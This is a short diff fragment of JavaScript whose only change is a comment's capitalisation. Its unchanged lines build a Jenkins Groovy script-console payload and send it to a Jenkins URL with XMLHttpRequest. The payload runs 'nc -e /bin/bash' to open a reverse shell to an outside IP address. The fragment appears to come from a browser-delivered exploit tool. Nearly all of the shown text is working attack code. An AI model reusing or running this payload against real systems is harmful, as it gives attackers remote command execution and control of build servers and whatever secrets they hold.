@@ -17,7 +17,7 @@
             // contruct jenkins groovy script payload
             var jenkinsPayload = `script=def command = 'nc -e /bin/bash 192.168.253.1 11235';def proc = command.execute();proc.waitFor();`;
 
-            // Construct and send the request
+            // construct and send the request
             var xmlHttp = new XMLHttpRequest();
             xmlHttp.open('POST', jenkinsUrl, true);
             xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
